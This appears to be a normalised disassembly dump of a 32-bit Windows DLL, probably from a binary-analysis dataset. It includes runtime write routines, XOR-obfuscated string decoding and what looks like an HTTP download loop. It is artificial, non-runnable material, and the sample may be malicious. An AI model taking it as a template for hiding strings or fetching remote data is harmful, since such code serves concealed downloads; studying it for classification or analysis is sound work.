call sub_1007f580
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x30 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x20 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10005219
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1006ee94
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1000f103
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10054390
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x1c
sub_10005290
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
push ebx
mov ebx [ lstrcmpW@IAT ]
mov [ ebp - 0x4 ] 0x0
push esi
lea eax [ edi + 0x1 ]
pop edi
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov edi [ edi + 0x4 ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ edi ]
mov ecx [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov esi [ edi + 0x4 ]
push ecx
push edx
call ebx
test eax eax
je r-xdata
pop esi
pop ebx
lea eax [ edi + 0x2 ]
pop edi
mov esp ebp
pop ebp
retn 0x8
push edi
call [ LocalFree@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov esp ebp
pop ebp
retn 0x8
call sub_100324d0
mov esi [ edi ]
test esi esi
je r-xdata
sub_10005320
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2d
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x40 ]
push edx
mov ecx esi
call sub_10034100
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_100449d0
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1000542c
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_10008d33
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_10066b6a
jmp r-xdata
sub_100054b4
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1006a2bc
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10005560
push ebp
mov ebp esp
push 0xffffffff
push sub_100884a6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x248
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ r--data ]
mov edi ecx
movsx ecx [ eax ]
xor ecx 0xffc4
and ecx 0xff
lea eax [ ebp - 0x254 ]
push eax
xor edx edx
mov [ ebp - 0x254 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x252 ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x0
push 0x1
push eax
lea eax [ ebp - 0x218 ]
call sub_1005bf30
test eax eax
je r-xdata
xor ecx ecx
push 0x4
mov [ ebp - 0x234 ] cx
push r--data
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] 0x0
call sub_10034100
lea edx [ ebp - 0x234 ]
push edx
lea edx [ ebp - 0x218 ]
lea esi [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x0
call sub_10040e00
add esp 0x4
push eax
lea ecx [ edi + 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_10033f90
mov esi 0x8
cmp [ ebp - 0x23c ] esi
jb r-xdata
mov eax 0x1
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x23c ] 0x7
mov [ ebp - 0x240 ] 0x0
mov [ ebp - 0x250 ] cx
cmp [ ebp - 0x220 ] esi
jb r-xdata
mov eax [ ebp - 0x250 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
xor eax eax
mov edx [ ebp - 0x234 ]
push edx
call sub_1000a86e
add esp 0x4
sub_100056ae
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x7ffffffe
jbe r-xdata
mov eax [ ecx + 0x14 ]
cmp eax esi
jae r-xdata
push r--data
call sub_10030594
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ecx + 0x10 ]
push esi
call sub_1005b9f6
jmp r-xdata
test esi esi
jne r-xdata
cmp esi 0x8
jae r-xdata
xor eax eax
cmp eax esi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
and [ ecx + 0x10 ] esi
cmp eax 0x8
jb r-xdata
mov eax [ ecx + 0x10 ]
cmp esi eax
jae r-xdata
xor eax eax
mov [ ecx ] ax
mov ecx [ ecx ]
push eax
push 0x1
call sub_10069470
jmp r-xdata
mov eax esi
sub_10005720
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push eax
push ecx
call sub_10046777
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
call sub_1005b670
mov edx [ eax ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov eax esi
sub_10005770
push ebp
mov ebp esp
sub esp 0x8
mov edx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ edx + 0x4 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov cl 0x1
mov [ ebp - 0x8 ] cl
jne r-xdata
mov ebx edi
mov [ ebp - 0x4 ] ebx
test cl cl
je r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push eax
cmp ecx [ eax + 0xc ]
jae r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
call sub_1000a86e
add esp 0x4
pop edi
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov ecx edi
mov ebx edx
call sub_10032b90
mov edx [ eax ]
pop edi
mov [ esi ] edx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
call sub_1006aee0
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov ebx edx
call sub_10032b90
mov ecx [ eax ]
pop edi
mov [ esi ] ecx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx [ eax + 0xc ]
mov edi eax
setb cl
mov [ ebp - 0x8 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_10005838
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jle r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_1004c8bd
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push eax
push [ ebp + 0x18 ]
call sub_1004c8bd
pop ecx
pop ecx
mov ecx esi
sub ecx eax
jne r-xdata
test eax eax
je r-xdata
xor eax eax
test ecx ecx
setns al
lea eax [ eax + eax + 0x1 ]
push 0x2
pop eax
jmp r-xdata
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
sub_100058a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov esi ecx
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
push edi
mov [ ebp - 0x4 ] eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov edi edx
shr edi 0x1f
add edi edx
cmp [ ebp - 0x4 ] edi
ja r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
cmp eax ecx
je r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x4 ] eax
ja r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax ecx
mov ecx [ ebx ]
call sub_10068ea0
mov edi [ esi + 0x4 ]
add esp 0x4
call sub_1006a100
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
mov ecx [ esi ]
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
lea eax [ eax + eax * 8 ]
lea edx [ ecx + eax * 4 ]
pop edi
mov [ esi + 0x4 ] edx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_10067720
mov edi [ esi + 0x4 ]
add esp 0x8
mov ebx eax
call sub_1006a100
pop edi
mov [ esi + 0x4 ] ebx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov edx [ ebx ]
lea eax [ edi + edi * 8 ]
lea edi [ edx + eax * 4 ]
mov eax ecx
push edi
mov ecx edx
call sub_10068ea0
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0x4 ]
mov ebx [ ebx + 0x4 ]
push ecx
push eax
push ebx
mov ecx edi
call sub_1004a640
add esp 0x10
mov [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov edi edx
shr edi 0x1f
add edi edx
call sub_10040420
test al al
je r-xdata
mov edi [ esi + 0x4 ]
mov eax ecx
call sub_1006a100
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x4
mov edi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
push edi
push eax
push edx
call sub_1004a640
add esp 0xc
mov [ esi + 0x4 ] eax
sub_10005a10
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov edx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x20 ]
push ecx
push edx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push esi
call sub_10048610
add esp 0x10
push eax
lea ecx [ esp + 0x24 ]
push 0x40
push ecx
call sub_1000f103
mov ecx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x18 ]
lea edx [ esp + 0x30 ]
push edx
mov edx [ ebp + 0xc ]
push eax
push ebx
push ecx
push edx
push edi
push esi
call sub_10012150
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x1c
sub_10005aa0
mov eax ecx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
retn
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] edx
mov ecx [ eax ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ eax ] ecx
retn
jmp r-xdata
mov [ eax ] edx
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov ecx edx
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
sub_10005aeb
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1006e175
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1002f5d0
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_100579de
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_100302aa
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_100302aa
push eax
push [ esi + 0x8 ]
call sub_1007f580
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_10005b50
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_1000a86e
add esp 0x4
pop ebx
push edi
push ebx
push esi
call sub_1007f580
add esp 0xc
sub_10005ba0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x4
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push 0x20000005
mov [ esi ] 0x0
mov eax [ ebx + 0xd8 ]
push edx
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x64
mov esp ebp
pop ebp
retn 0x4
push 0x400
push 0x8
mov [ ebp - 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi ] eax
mov ecx [ esi ]
lea edx [ ebp - 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push 0x400
add ecx eax
mov eax [ ebx + 0xdc ]
push ecx
push edx
call eax
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push eax
mov [ edi ] eax
mov eax [ ebx + 0xdc ]
push edx
call eax
mov ecx [ ebp - 0x4 ]
cmp ecx [ esi ]
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
mov eax 0x5
mov esp ebp
pop ebp
retn 0x4
test eax eax
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
mov eax 0x6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
add [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
add eax 0x400
push eax
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
mov [ edi ] eax
add eax [ esi ]
mov edx [ ebx + 0xdc ]
push 0x400
push eax
push ecx
call edx
test eax eax
jne r-xdata
sub_10005cc9
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_10080420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_1003a6bb
mov [ eax ] edi
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10032529
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
jmp r-xdata
push esi
call sub_10020fd7
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_10049f3a
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_1002d269
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_1005b670
mov [ eax ] 0x1c
call sub_1003a6bb
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_1005bae3
pop ecx
jmp r-xdata
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_1006022e
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_1005c469
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_10027385
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
